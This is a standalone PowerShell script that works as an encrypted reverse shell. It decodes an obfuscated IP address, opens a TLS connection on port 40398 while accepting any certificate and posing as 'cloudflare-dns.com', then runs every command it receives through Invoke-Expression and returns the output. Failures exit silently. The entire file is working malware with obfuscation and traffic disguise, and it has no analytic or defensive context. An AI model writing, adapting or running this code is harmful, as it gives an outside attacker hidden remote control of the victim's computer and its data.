
$Active = 1; 


if ($Active -ne 1) { exit }


try {
    $sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12;
    
    
    $targetIP = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((-join([char]0x4D, [char]0x54, [char]0x51, [char]0x32, [char]0x4C, [char]0x6A, [char]0x63, [char]0x77, [char]0x4C, [char]0x6A, [char]0x49, [char]0x30, [char]0x4D, [char]0x43, [char]0x34, [char]0x79, [char]0x4D, [char]0x44, [char]0x55, [char]0x3D))));
    $port = 40398;

    $TCPClient = New-Object Net.Sockets.TCPClient($targetIP, $port);
    $NetworkStream = $TCPClient.GetStream();
    
    
    $SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
    $SslStream.AuthenticateAsClient(([System.Text.Encoding]::UTF8.GetString([byte[]](0x63,0x6C,0x6F,0x75,0x64,0x66,0x6C,0x61,0x72,0x65,0x2D,0x64,0x6E,0x73,0x2E,0x63,0x6F,0x6D))), $null, $sslProtocols, $false);

    if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {
        $SslStream.Close();
        exit;
    }

    $StreamWriter = New-Object IO.StreamWriter($SslStream);
    $StreamWriter.AutoFlush = $true;

    # Function to format the shell prompt
    function WriteToStream ($String) {
        [byte[]]$script:Buffer = New-Object System.Byte[] 4096;
        $StreamWriter.Write($String + "$([char]0x50)$([char]0x53)$([char]0x20)" + (Get-Location).Path + "$([char]0x3E)$([char]0x20)");
    };

    WriteToStream '';

    
    while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
        $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1).Trim();
        
        if ($Command -eq (-join([char]0x65, [char]0x78, [char]0x69, [char]0x74))) { break }
        
        $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
        
        WriteToStream ($Output);
    }

    $StreamWriter.Close();
    $TCPClient.Close();
} catch {
    # If server is down, script exits here with 0 errors shown to the OS
    exit;
}
